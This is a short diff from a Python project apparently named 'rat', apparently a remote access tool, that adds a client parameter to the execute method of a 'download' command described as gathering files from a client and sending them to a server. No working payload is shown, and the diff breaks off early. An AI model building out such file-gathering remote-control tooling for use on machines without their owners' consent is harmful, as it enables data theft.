@@ -4,11 +4,10 @@ from rat.commands.base_command import BaseCommand
 
 
 class DownloadCommand(BaseCommand):
-
     name = "download"
     description = "Gather files from client and send them to server"
 
-    def execute(self, args: str) -> str:
+    def execute(self, args: str, client) -> str:
 
         if not args:
 
